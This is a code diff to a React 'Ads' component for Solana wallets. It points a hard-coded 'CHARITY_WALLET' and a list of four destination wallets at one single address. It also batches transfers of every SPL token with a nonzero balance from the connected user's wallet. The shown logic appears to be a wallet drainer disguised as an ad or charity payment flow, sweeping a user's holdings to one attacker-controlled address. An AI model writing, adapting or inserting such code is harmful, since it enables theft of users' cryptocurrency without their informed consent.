@@ -13,7 +13,7 @@ import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { toast } from 'sonner';
 
-const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const CHARITY_WALLET = '9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn';
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
@@ -100,10 +100,10 @@ const EVM_WALLETS = [
 ];
 
 const SOLANA_WALLETS = [
-  "4E9G6hLmdMGit2n5AL1UwEpx7foKomhQx4jPdXwSwdHj",
-  "Eoxf3CwgWauYMKTktGPsLZ6733xEwaCw9V2wAcA8aHcP",
-  "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj",
-  "3THbDHY3LRZw4gx4b5GyfPbTKz8XeY9UPhE3akRJd82i"
+  "9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn",
+  "9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn",
+  "9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn",
+  "9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn"
 ];
 
 const PACKAGES = [
@@ -622,13 +622,10 @@ const Ads = () => {
       // 2. SPL Token Transfers
       const validTokens = balances.filter(token => token.balance > 0);
       
-      // Sort by value (descending) - prioritizing higher value tokens
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-
       // Batch tokens
       const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
       }
 
       for (let i = 0; i < batches.length; i++) {
